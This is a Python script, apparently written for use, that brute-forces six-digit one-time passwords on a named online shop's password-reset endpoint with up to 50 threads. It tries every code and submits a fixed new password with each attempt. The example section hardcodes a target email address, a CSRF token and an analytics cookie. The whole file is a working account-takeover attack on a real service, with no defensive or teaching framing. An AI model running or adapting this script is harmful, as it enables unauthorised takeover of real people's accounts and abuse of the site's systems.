#!/usr/bin/env python3
"""
ULTRA-SIMPLE & FAST OTP Brute Force Function

Single function for maximum speed OTP brute forcing.
Just call the function with parameters and get results.
"""

import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import quote


def fast_otp_brute_force(start_range, end_range, email, csrf_token, ga_cookie, threads=50):
    """
    ULTRA-FAST OTP Brute Force - Simple Function
    
    Args:
        start_range (int): Starting OTP (e.g., 0)
        end_range (int): Ending OTP (e.g., 999999)  
        email (str): Target email address
        csrf_token (str): CSRF token from cookies
        ga_cookie (str): _ga cookie value
        threads (int): Number of concurrent threads (default: 50)
    
    Returns:
        str: Valid OTP if found, None otherwise
    
    Example:
        result = fast_otp_brute_force(100000, 200000, "test@email.com", "csrf123", "ga123", 30)
    """
    
    # Shared variables with thread safety
    success_event = threading.Event()
    found_otp = [None]  # Use list for mutable reference
    attempt_count = [0]
    lock = threading.Lock()
    
    def test_otp(otp_str):
        """Test single OTP - optimized for speed"""
        if success_event.is_set():
            return False
        
        # Create session with minimal setup
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest"
        })
        
        session.cookies.set('csrftoken', csrf_token)
        session.cookies.set('_ga', ga_cookie)
        
        data = {
            "step": "5",
            "otp_email": quote(email, safe='@'),
            "otpverify": otp_str,
            "new_password": "Aa12345!B",
            "csrfmiddlewaretoken": csrf_token
        }
        
        try:
            response = session.post("https://techshopbd.com/sign-in", data=data, timeout=3)
            
            with lock:
                attempt_count[0] += 1
            
            # Quick success check
            if response.status_code == 200 and any(word in response.text.lower() 
                for word in ["success", "dashboard", "welcome", "profile"]):
                
                with lock:
                    if not found_otp[0]:  # First success wins
                        found_otp[0] = otp_str
                        success_event.set()
                return True
                
        except:
            pass
        
        return False
    
    # Generate OTP list
    otp_list = [f"{i:06d}" for i in range(start_range, end_range + 1)]
    total_otps = len(otp_list)
    
    print(f"🚀 Fast OTP Brute Force: {start_range:06d}-{end_range:06d} ({total_otps:,} OTPs, {threads} threads)")
    
    start_time = time.time()
    
    # Execute with thread pool
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(test_otp, otp): otp for otp in otp_list}
        
        for future in as_completed(futures):
            if success_event.is_set():
                # Cancel remaining tasks
                for f in futures:
                    f.cancel()
                break
                
            # Progress update
            if attempt_count[0] % 500 == 0:
                elapsed = time.time() - start_time
                rate = attempt_count[0] / elapsed if elapsed > 0 else 0
                print(f"⚡ {attempt_count[0]:,} attempts | {rate:.0f}/sec")
    
    elapsed = time.time() - start_time
    
    if found_otp[0]:
        print(f"🎉 SUCCESS: {found_otp[0]} | Time: {elapsed:.1f}s | Rate: {attempt_count[0]/elapsed:.0f}/sec")
        return found_otp[0]
    else:
        print(f"❌ Failed | {attempt_count[0]:,} attempts | {elapsed:.1f}s")
        return None


# USAGE EXAMPLES:

def example_usage():
    """Show how to use the function"""
    
    # Your actual values
    email = "ariel.agra.archive@gmail.com"
    csrf_token = "pzMrUb99bdHRYHSxcJhdf4hZEkB89dt6" 
    ga_cookie = "GA1.1.891817179.1758869982"
    
    # Test small range first (fast)
    print("Example 1: Small range test")
    result = fast_otp_brute_force(
        start_range=100000,
        end_range=101000,  # 1000 OTPs
        email=email,
        csrf_token=csrf_token,
        ga_cookie=ga_cookie,
        threads=20
    )
    
    if result:
        print(f"Found: {result}")
        return result
    
    # Full range if needed (slower)
    print("\nExample 2: Full range")
    result = fast_otp_brute_force(
        start_range=0,
        end_range=999999,  # All 6-digit OTPs
        email=email,
        csrf_token=csrf_token,
        ga_cookie=ga_cookie,
        threads=50
    )
    
    return result


if __name__ == "__main__":
    # Run examples
    example_usage()